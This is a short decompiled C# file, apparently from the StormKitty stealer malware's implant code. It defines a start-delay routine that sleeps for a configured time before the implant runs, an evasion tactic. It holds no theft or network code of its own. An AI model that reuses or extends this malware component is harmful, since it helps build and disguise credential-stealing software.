﻿using System;
using System.Threading;

namespace StormKitty.Implant
{
	// Token: 0x0200006F RID: 111
	internal sealed class StartDelay
	{
		// Token: 0x060001B7 RID: 439 RVA: 0x0000D80C File Offset: 0x0000BA0C
		public static void Run()
		{
			new Random().Next(StartDelay.SleepMin * 1000, StartDelay.SleepMax * 1000);
			Thread.Sleep(int.Parse(Config.Sleeptime) * 1000);
		}

		// Token: 0x040000FE RID: 254
		private static readonly int SleepMin = 0;

		// Token: 0x040000FF RID: 255
		private static readonly int SleepMax = 10;
	}
}
